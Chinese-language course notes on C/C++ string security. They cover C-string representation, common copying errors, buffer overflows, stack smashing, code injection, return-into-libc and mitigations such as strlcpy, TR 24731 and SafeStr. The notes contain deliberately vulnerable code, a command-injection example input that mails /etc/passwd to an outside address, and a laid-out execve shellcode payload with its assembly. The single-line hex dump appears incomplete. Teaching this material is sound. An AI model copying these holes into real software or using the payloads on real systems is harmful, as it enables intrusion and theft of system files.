# 一、字符串基础

## 1. 字符串与软件交互

字符串承载终端用户与软件系统交互的大部分数据，典型来源包括：

- 命令行参数。
- 环境变量。
- 控制台输入。

软件漏洞及其利用可能由以下字符串缺陷导致：

1. 字符串表示法存在问题。
2. 字符串管理不当。
3. 字符串操作缺少边界约束。

## 2. C 风格字符串

字符串是软件工程中的基本概念，但不是 C 或 C++ 的内建类型。

> **C 风格字符串**：由一段连续字符序列组成，并以空字符 `\0` 结束。

以 `hello` 为例，其内存表示为：

| 偏移 | 0 | 1 | 2 | 3 | 4 | 5 |
|---:|---|---|---|---|---|---|
| 内容 | `h` | `e` | `l` | `l` | `o` | `\0` |

- 指向字符串的指针实际指向字符串的起始字符。
- 字符串的**长度**是空字符之前的字符个数；`hello` 的长度为 5。
- 字符串的值是其中按顺序排列的字符序列。
- 存储字符串所需的空间是字符串内容所占空间再加一个字符单元，用于保存末尾的空字符。

## 3. 字符数组的边界术语

| 术语 | 含义 |
|---|---|
| Bound（界限） | 数组中的元素个数 |
| Lo（低位地址） | 数组首元素的地址 |
| Hi（高位地址） | 数组末元素的地址 |
| TooFar | `Hi` 之后的一个位置，即数组末元素之后加 1 的地址 |
| Tsize（目标大小） | 与 `sizeof(array)` 相同 |
| Null-terminated（空字符结尾） | 在 `Hi` 或它之前存在空终结符 |
| Length（长度） | 空终结符之前的字符数量 |

C 标准允许形成指向数组末元素之后一个位置的指针，即 `TooFar`，但不能在不产生未定义行为的情况下解引用该指针。

## 4. UTF-8

课件将 UTF-8 描述为变长字节编码：单字节编码的最高位为 `0`；多字节编码的首字节以若干连续的 `1` 标识字节数，其余字节均以 `10` 开头。课件给出的 1～6 字节位模式如下：

| 字节数 | 位模式 |
|---:|---|
| 1 | `0xxxxxxx` |
| 2 | `110xxxxx 10xxxxxx` |
| 3 | `1110xxxx 10xxxxxx 10xxxxxx` |
| 4 | `11110xxx 10xxxxxx 10xxxxxx 10xxxxxx` |
| 5 | `111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx` |
| 6 | `1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx` |

## 5. 字面值与 C++ 字符串

> **字符串字面值**：由双引号包围的零个或多个字符组成的序列。

C++ 标准提供类模板 `std::basic_string`，其 `char` 实例化类型为 `std::string`。与 C 风格字符串相比，`basic_string` 更不容易出现安全漏洞，但 C 风格字符串仍常见于 C++ 程序，原因包括：

- 字符串字面值仍以字符数组形式参与程序。
- 程序需要与接收 C 风格字符串的现有函数库交互。
- 一些程序直接使用 C 风格字符串库。

因此，一个 C++ 程序往往需要同时处理多种字符串类型。

# 二、常见的字符串操作错误

## 1. 错误类型概览

使用 C 风格字符串编程容易出现以下错误：

1. 无界字符串复制。
2. 空结尾错误。
3. 字符串截断。
4. 差一错误。
5. 数组写入越界。
6. 不恰当的数据处理。

> [!warning] 课件顺序不一致
> 目录页将“空结尾错误、截断、差一错误”列为第 2～4 项，后续正文却按“差一错误、空结尾错误、字符串截断”展开。本笔记保留正文讲授顺序，并保留各标题在课件中的编号。

## 2. 无界字符串复制

> **无界字符串复制**：从无界数据源向定长字符数组复制数据，且复制操作不限制实际写入量。

下例中，`gets()` 不限制输入长度，而 `Password` 只有 8 个字符单元：

```c
int main(void) {
    char Password[8];
    puts("Enter 8 character password:");
    gets(Password);
    /* ... */
}
```

`strcpy()` 和 `strcat()` 同样执行无界复制或连接。下例中的两个命令行参数均可能使 `name` 越界：

```c
int main(int argc, char *argv[]) {
    char name[2048];
    strcpy(name, argv[1]);
    strcat(name, " = ");
    strcat(name, argv[2]);
}
```

一种简单方案是先使用 `strlen()` 获得输入长度，再动态分配足够内存：

```c
int main(int argc, char *argv[]) {
    char *buff = (char *)malloc(strlen(argv[1]) + 1);
    if (buff != NULL) {
        strcpy(buff, argv[1]);
        printf("argv[1] = %s.\n", buff);
    } else {
        /* Couldn't get the memory - recover */
    }
    return 0;
}
```

课件中的 C++ 示例同样会在输入超过 11 个字符时越界：

```cpp
#include <iostream.h>

int main(void) {
    char buf[12];
    cin >> buf;
    cout << "echo: " << buf << endl;
}
```

设置流的域宽可以限制一次提取操作；提取结束后域宽重置为 0：

```cpp
#include <iostream.h>

int main(void) {
    char buf[12];
    cin.width(12);
    cin >> buf;
    cout << "echo: " << buf << endl;
}
```

## 3. 差一错误

课件要求找出下列程序中的差一错误：

```c
int main(int argc, char *argv[]) {
    char source[10];
    strcpy(source, "0123456789");
    char *dest = (char *)malloc(strlen(source));
    for (int i = 1; i <= 11; i++) {
        dest[i] = source[i];
    }
    dest[i] = '\0';
    printf("dest = %s", dest);
}
```

> [!warning] 源程序为错误示例
> 该代码按课件原意保留：10 个字符再加结尾空字符已经超过 `source[10]`；动态分配未给空字符预留空间；循环从 1 开始且上界越过合法范围；循环后对 `i` 的使用还与其声明作用域有关。此代码不可直接用于实际程序。

## 4. 空结尾错误

使用 C 风格字符串时，常见问题是数组末尾没有正确的空字符：

```c
int main(int argc, char *argv[]) {
    char a[16];
    char b[16];
    char c[32];

    strncpy(a, "0123456789abcdef", sizeof(a));
    strncpy(b, "0123456789abcdef", sizeof(b));
    strncpy(c, a, sizeof(c));
}
```

这里 `a` 与 `b` 的 16 个位置全部被非空字符占用，因而没有正确结尾；随后把 `a` 当作字符串传给 `strncpy()` 会继续读取，风险进一步传播。

ISO/IEC 9899:1999 中的函数原型为：

```c
char *strncpy(
    char *restrict s1,
    const char *restrict s2,
    size_t n
);
```

`strncpy()` 从 `s2` 向 `s1` 复制不超过 `n` 个字符，空字符之后的字符不会被复制。如果 `s2` 的前 `n` 个字符中没有空字符，结果就不会以空字符结尾。

## 5. 字符串截断

为了防止缓冲区溢出，常使用限制字节数的函数：

- 用 `strncpy()` 代替 `strcpy()`。
- 用 `fgets()` 代替 `gets()`。
- 用 `snprintf()` 代替 `sprintf()`。

当目标字符数组不足以容纳完整字符串时，会发生字符串截断。截断会造成数据丢失，有时还会进一步导致软件漏洞，因此调用者必须检查结果，而不能只假定“限制长度”等同于安全。

## 6. 数组写入越界

```c
int main(int argc, char *argv[]) {
    int i = 0;
    char buff[128];
    char *arg1 = argv[1];

    while (arg1[i] != '\0') {
        buff[i] = arg1[i];
        i++;
    }
    buff[i] = '\0';
    printf("buff = %s\n", buff);
}
```

程序没有检查 `arg1` 的长度。由于 C 风格字符串本质上是字符数组，任何不调用标准库函数的手写复制循环也必须显式检查目标边界。

## 7. 不恰当的数据处理

下例把用户提供的邮件地址拼接到命令字符串中，再使用 `system()` 执行：

```c
sprintf(
    buffer,
    "/bin/mail %s < /tmp/email",
    addr
);
system(buffer);
```

若输入中含有命令分隔符和附加命令，数据就会被解释成控制指令。课件示例输入为：

```text
bogus@addr.com; cat /etc/passwd | mail some@badguy.net
```

这表明字符串风险不仅来自长度，还来自**数据与指令混淆**。

# 三、字符串漏洞

## 1. 缓冲区溢出

> **缓冲区溢出**：向为某一数据结构分配的内存边界之外写入数据。

它通常由忽视或不检查缓冲区边界造成。课件用“把 16 B 源数据复制到 12 B 目标缓冲区”说明结果：

| 目标范围 | 写入结果 |
|---|---|
| 已分配的 12 B | 前 12 B 数据合法写入 |
| 相邻内存的 4 B | 后 4 B 越界写入并覆盖其他数据 |

被溢出数据修改的对象可能包括：

- 普通变量。
- 数据指针。
- 函数指针。
- 栈返回地址。

## 2. `IsPasswordOK()` 示例

```c
bool IsPasswordOK(void) {
    char Password[12];
    gets(Password);
    if (!strcmp(Password, "goodpass"))
        return true;
    else
        return false;
}

void main(void) {
    bool PwStatus;
    puts("Enter Password:");
    PwStatus = IsPasswordOK();
    if (PwStatus == false) {
        puts("Access denied");
        exit(-1);
    } else {
        puts("Access granted");
    }
}
```

`Password[12]` 最多只能容纳 11 个普通字符和 1 个结尾空字符。输入过长时，程序可能崩溃；也可能覆盖保存的 EBP、返回地址等相邻栈数据。

| 从当前栈顶向旧栈帧方向 | 正常内容 | 课件溢出示意 |
|---|---|---|
| `Password` | 12 B | 写入前 12 个字符 |
| 调用者 EBP | 4 B | 被后续字符覆盖 |
| 返回到 `main` 的地址 | 4 B | 可能被构造值替换 |
| `PwStatus` | 4 B | 原值可能受影响 |
| 调用者 EBP（OS） | 4 B | 更旧栈帧状态 |
| `main` 返回到 OS 的地址 | 4 B | 更旧返回地址 |

课件演示了输入 `1234567890123456j▶*!` 后程序显示 `Access granted`。图中说明该输入继续覆盖了栈中的 9 B 存储空间，改变调用者返回地址，使控制流跳过“拒绝访问”路径并转到后续语句。该例说明溢出不仅会导致崩溃，也可能改变控制流。

> [!warning] 架构与编译器相关
> 示例中的具体覆盖字节数、地址、栈对齐和控制流结果依赖 32 位体系结构、编译器版本及其栈布局。课件还指出 GCC 版本编译器会按 16 B 边界分配、对齐栈空间。

## 3. 栈粉碎

> **栈粉碎**：缓冲区溢出覆盖执行栈中已分配的数据，尤其是保存的帧状态和返回地址。

这是严重的可靠性与安全性漏洞。成功利用时，攻击者可以覆盖栈返回地址，把控制权转移到目标机器上的任意代码。

## 4. 代码注入与恶意参数

代码注入的一般过程为：

```mermaid
flowchart LR
    A[构造恶意参数] --> B[漏洞程序接受输入]
    B --> C[越界数据覆盖返回地址]
    C --> D[函数返回时控制流转移]
    D --> E[恶意代码以漏洞程序权限运行]
```

恶意参数通常是蓄意构造的字符串，其中既包含指向恶意代码的地址，也可能直接包含攻击者提供的代码。其必要特征包括：

1. 能被漏洞程序当作合法输入接收。
2. 参数及其他可控输入能够触发漏洞代码路径。
3. 在控制权转移到恶意代码前，不会使程序提前异常终止。

注入代码以漏洞程序相同的权限运行，因此攻击者通常以高权限程序为目标。

## 5. 二进制利用参数的组成

课件以 `./vulprog < exploit.bin` 演示二进制输入。示例负载由以下部分顺序组成：

| 行 | 地址或范围 | 内容与作用 |
|---:|---|---|
| 1 | `0xbffff9c0`～`0xbffff9cf` | 前 16 B 填充密码区域；程序声明 12 B，但编译器按 16 B 分配 |
| 2 | `0xbffff9d0`～`0xbffff9db` | 接下来的 12 B 填充为 16 B 栈对齐而生成的额外空间 |
| 3 | `0xbffff9dc` | 写入新返回地址 `0xbffff9e0` |
| 4 | `0xbffff9e0` | `xor %eax, %eax`，将 EAX 清零 |
| 5 | `0xbffff9e2` | `mov %eax, 0xbffff9ff`，在指定位置写入空值 |
| 6 | `0xbffff9e7` | `mov $0xb, %al`，设置 `execve` 系统调用号 |
| 7 | `0xbffff9e9` | `mov $0xbffffa03, %ebx`，设置参数 1 指针 |
| 8 | `0xbffff9ee` | `mov $0xbffff9fb, %ecx`，设置参数 2 指针 |
| 9 | `0xbffff9f3` | `mov 0xbffff9ff, %edx`，设置参数 3 指针 |
| 10 | `0xbffff9f9` | `int $0x80`，发起 `execve` 系统调用 |
| 11 | `0xbffff9fb` | 参数 2 的指针数组，包含指向 `0xbffff9ff` 的指针 |
| 12 | `0xbffff9ff` | 初始内容为 `"1111"`，运行时改为 `0x00000000`，既终止指针数组，也用作参数 3 |
| 13 | `0xbffffa03`～`0xbffffa0f` | 参数字符串 `/usr/bin/cal\0` |

课件给出的负载十六进制转储如下：

```text

010 37 38 39 30 31 32 33 34 35 36 37 38 E0 F9 FF BF
```

## 6. Shellcode 示例

恶意参数的目的在于把控制权转移给恶意代码。该代码可以包含在参数中，也可以在有效输入操作期间注入；由于常用于启动命令解释器或其他程序，通常称为 **shellcode**。

课件中的 IA-32/Linux 汇编意图如下：

```asm
xor %eax, %eax              # 将 EAX 清零
mov %eax, 0xbffff9ff        # 写入空值
mov $0xb, %al               # execve 的系统调用号
mov $0xbffffa03, %ebx       # 参数 1 指针
mov $0xbffff9fb, %ecx       # 参数 2 指针
mov 0xbffff9ff, %edx        # 参数 3 指针
int $0x80                   # 发起系统调用
```

因为负载在最后一个字节前不能包含空字符，示例代码先通过 `xor` 生成零值，再把它写入内存，用作空指针并终止参数列表。`execve()` 的三个参数及其数据都布置在负载中；系统调用最终启动示例程序。

## 7. 弧注入（return-into-libc）

> **弧注入**：不注入新代码，而是把控制转移到程序内存空间中已经存在的代码，并在原控制流中插入新的跳转“弧”。

攻击者可以把返回地址替换为现有函数地址，例如 `system()` 或 `exec()`，以执行本地已有程序。课件使用下列漏洞程序说明该方法：

```c
#include <string.h>

int get_buff(char *user_input) {
    char buff[4];
    memcpy(buff, user_input, strlen(user_input) + 1);
    return 0;
}

int main(int argc, char *argv[]) {
    get_buff(argv[1]);
    return 0;
}
```

利用过程包括：

1. 使用已有函数地址覆盖返回地址。
2. 在栈中伪造连续帧，把多个函数调用链接起来。
3. 在执行完成后恢复原始帧，使程序继续运行，以降低被检测的可能性。

### （1）溢出前后的栈

| 阶段 | 栈中主要内容 |
|---|---|
| 溢出前 | `buff[4]`、`ebp(main)`、`return addr(main)`、原始 `main` 栈帧 |
| 溢出后 Frame 1 | `ebp(frame 2)`、`f()` 地址、`leave/ret` 地址、`f()` 参数指针、`f()` 参数数据 |
| 溢出后 Frame 2 | `ebp(frame 3)`、`g()` 地址、`leave/ret` 地址、`g()` 参数指针、`g()` 参数数据 |
| Original Frame | 原始 EBP、返回到 `main` 的地址 |

### （2）返回链执行过程

| 步骤 | 寄存器与栈变化 | 控制流结果 |
|---:|---|---|
| 1 | `get_buff()` 执行 `mov esp, ebp; pop ebp; ret` | 取出伪造的 `f()` 地址并转入 `f()` |
| 2 | Frame 1 成为当前帧，`f()` 获得伪造参数 | `f()` 执行其功能 |
| 3 | `f()` 返回到预置的 `leave/ret` 序列 | 恢复 Frame 2 所需的 EBP 和 ESP |
| 4 | `ret` 取出伪造的 `g()` 地址 | 控制流转入 `g()` |
| 5 | Frame 2 成为当前帧，`g()` 获得伪造参数 | `g()` 执行其功能 |
| 6 | `g()` 返回到另一段 `leave/ret` 序列 | 原 EBP 与原始帧被恢复 |
| 7 | 最终 `ret` 取出原返回地址 | 控制流返回 `main()` 继续执行 |

弧注入的重要性体现在：

- 可以把多个函数及其参数链接起来。
- 利用代码已经存在于代码段中，不需要注入新代码。
- 仅基于“内存不可执行”的保护不能单独阻止弧注入。
- 所需溢出空间可能比完整代码注入更小。
- 原始帧能够恢复，使异常控制流更难被发现。

# 四、缓解措施

## 1. 总体思路

缓解措施包括两类目标：

1. 预防缓冲区溢出。
2. 检测溢出并安全恢复，使漏洞利用失败。

按照缓冲区管理方式，又可分为：

| 策略 | 核心做法 | 主要代价 |
|---|---|---|
| 静态分配 | 使用固定大小缓冲区，满后拒绝或丢弃额外数据 | 可能截断并丢失数据，结果必须充分验证 |
| 动态分配 | 按需申请并调整缓冲区 | 可能耗尽内存，引发拒绝服务；存在性能开销 |

## 2. 输入验证

缓冲区溢出通常来自字符串或内存越界复制。最基本的预防方法是确保输入长度不超过目标缓冲区容量：

```c
int myfunc(const char *arg) {
    char buff[100];
    if (strlen(arg) >= sizeof(buff)) {
        abort();
    }
}
```

静态防范措施包括：

- 输入验证。
- `strlcpy()` 与 `strlcat()`。
- ISO/IEC “Security” TR 24731。

## 3. `strlcpy()` 与 `strlcat()`

这两个函数用较不容易出错的接口完成复制和连接：

```c
size_t strlcpy(char *dst, const char *src, size_t size);
size_t strlcat(char *dst, const char *src, size_t size);
```

- `strlcpy()` 把 `src` 中以空字符结尾的字符串复制到 `dst`，目标总空间由 `size` 指定。
- `strlcat()` 把 `src` 连接到 `dst` 末尾，目标总空间同样由 `size` 指定。
- 对非零长度的目标缓冲区，两者都保证结果以空字符结尾。
- 静态数组的大小通常可由 `sizeof()` 获得；动态缓冲区的实际大小不容易自动计算。

两者返回**希望创建的完整字符串长度**：

| 函数 | 返回值 |
|---|---|
| `strlcpy()` | 源字符串总长度 |
| `strlcat()` | 连接前目标字符串长度与源字符串长度之和 |

调用者必须检查返回值是否小于 `size`，否则发生了截断。若已截断，可据返回值确定所需空间，再重新分配或复制。

> [!warning] 并非自动安全
> 课件指出，这两个函数可见于 OpenBSD、Solaris 等 UNIX 变体，但不包含在 GNU/Linux 的 glibc 中。若传入的 `size` 大于目标缓冲区实际容量，仍可能溢出；若不检查返回值，仍可能遗漏截断错误。

## 4. ISO/IEC “Security” TR 24731

ISO/IEC JTC1 SC22 WG14 的 TR 24731 定义了更少出错的 C 标准函数版本：

| 原函数 | 对应版本 |
|---|---|
| `strcpy()` | `strcpy_s()` |
| `strcat()` | `strcat_s()` |
| `strncpy()` | `strncpy_s()` |
| `strncat()` | `strncat_s()` |

课件列出的设计目标包括：

- 缓解缓冲区溢出攻击。
- 默认保护与计划相关文件。
- 不产生未结尾的字符串。
- 不意外截断字符串。
- 保持空字符结尾的字符串数据类型。
- 支持编译期检查。
- 使失败显现。
- 采用统一的函数参数和返回类型模式。

> [!warning] 课件表述待核验
> “默认保护与计划相关文件”为课件第 75 页原文，其具体含义未在后续页面展开，本笔记不据此改写或补充解释。

`strcpy_s()` 的原型为：

```c
errno_t strcpy_s(
    char *restrict s1,
    rsize_t s1max,
    const char *restrict s2
);
```

与 `strcpy()` 相比，它增加了 `s1max` 参数，用于指定目标缓冲区的最大长度。只有源字符串能完整复制到目标缓冲区、且不发生溢出时才算成功。

```c
int main(int argc, char *argv[]) {
    char a[16];
    char b[16];
    char c[24];

    strcpy_s(a, sizeof(a), "0123456789abcdef");
    strcpy_s(b, sizeof(b), "0123456789abcdef");
    strcpy_s(c, sizeof(c), a);
    strcat_s(c, sizeof(c), b);
}
```

在该例中，前两个复制操作无法在 16 B 数组中同时容纳 16 个字符和空终结符，因此产生运行时约束错误。

TR 24731 函数可用于预防性维护和遗留系统现代化，但不是“完全安全的”：

- 课件指出它们可在 Microsoft Visual C++ 2005 中使用。
- 若目标缓冲区最大长度仍被错误指定，函数仍可能发生问题。
- 相关标准化工作可能仍在发展。

## 5. 动态缓冲区与 SafeStr

动态方法在需要时调整额外内存，不必丢弃超出固定缓冲区的数据；但若输入不受限制，可能耗尽内存并导致拒绝服务。

SafeStr 由 Matt Messier 与 John Viega 编写，为 C 提供具有安全语义、可与遗留库互操作的字符串操作库。它在需要增加字符串容量时重新分配内存并移动内容，从而自动调整字符串大小，避免因固定容量不足而产生缓冲区溢出。

### （1）`safestr_t` 类型

- SafeStr 以 `safestr_t` 类型为基础。
- `safestr_t` 与 `char *` 兼容，可转换成 `char *` 作为 C 风格字符串使用。
- 它在所指内存之前保存说明信息，例如实际长度和已分配长度。

### （2）错误处理

SafeStr 使用 XXL 库进行错误处理：

- XXL 为 C 和 C++ 提供异常与资源管理。
- 调用者负责处理异常。
- 若没有指定异常处理程序，默认向 `stderr` 输出消息并调用 `abort()`。
- 该方案同时依赖 SafeStr 与 XXL 两个库。

```c
safestr_t str1;
safestr_t str2;

XXL_TRY_BEGIN {
    str1 = safestr_alloc(12, 0);
    str2 = safestr_create("hello, world\n", 0);
    safestr_copy(&str1, str2);
    safestr_printf(str1);
    safestr_printf(str2);
}
XXL_CATCH(SAFESTR_ERROR_OUT_OF_MEMORY) {
    printf("safestr out of memory.\n");
}
XXL_EXCEPT {
    printf("string operation failed.\n");
}
XXL_TRY_END;
```

## 6. 受管理字符串

受管理字符串负责：

1. 分配缓冲区，并在需要额外空间时调整大小。
2. 管理字符串操作，确保不发生缓冲区溢出。
3. 避免数据丢失。
4. 确保字符串正常终止；内部表示可能使用空字符结尾，也可能不使用。

其缺点是可能无限制消耗内存，引发拒绝服务，并产生性能开销。

课件使用不透明类型隐藏实现：

```c
struct string_mx;
typedef struct string_mx *string_m;
```

这种类型具有私有、特定于实现的特征。创建和回收示例为：

```c
errno_t retValue;
char *cstr;                  /* C style */
string_m str1 = NULL;

if ((retValue = strcreate_m(&str1, "hello, world"))) {
    fprintf(stderr, "Error %d from strcreate_m.\n", retValue);
} else {
    if ((retValue = getstr_m(&cstr, str1))) {
        fprintf(stderr, "error %d from getstr_m.\n", retValue);
    }
    printf("(%s)\n", cstr);
    free(cstr);              /* free duplicate string */
}
```

统一状态码用于提供返回值、防止过度嵌套并鼓励调用者检查状态。

## 7. 黑名单、白名单与数据处理

| 方法 | 做法 | 局限或优势 |
|---|---|---|
| 黑名单 | 用下划线或其他无害字符替换已知危险输入 | 必须识别所有危险字符及组合；编码或转义可能绕过检查 |
| 白名单 | 定义允许字符集合，删除不允许的字符 | 可接受输入通常可预测、定义明确且规模可控 |

若不了解被调用的程序、流程、库或组件，黑名单很难正确维护。字符串管理库还可以通过预定义安全字符集处理数据：

```c
errno_t setcharset(
    string_m s,
    const string_m safeset
);
```

# 本章小结

| 模块 | 核心结论 |
|---|---|
| 字符串表示 | C/C++ 中的 C 风格字符串是以空字符结尾的字符数组，语言和标准库通常不会隐式检查边界 |
| 常见错误 | 无界复制、差一错误、空结尾错误、截断、数组越界与数据—指令混淆都可能形成漏洞 |
| 漏洞利用 | 缓冲区溢出可覆盖变量、指针和返回地址；栈粉碎可进一步实现代码注入或弧注入 |
| 静态防护 | 输入验证、正确传递缓冲区大小、检查截断结果和使用约束更强的函数接口 |
| 动态防护 | 动态字符串管理能减少固定缓冲区溢出与数据丢失，但必须防止内存耗尽和性能问题 |
| C++ 字符串 | `basic_string` 相比裸字符数组更不容易出错，但与 C 接口交互时仍需处理边界和转换风险 |
| 遗留系统 | ISO/IEC TR 24731 的 `_s` 系列函数可用于预防性维护和现代化改造，但不能替代正确的容量计算与错误检查 |
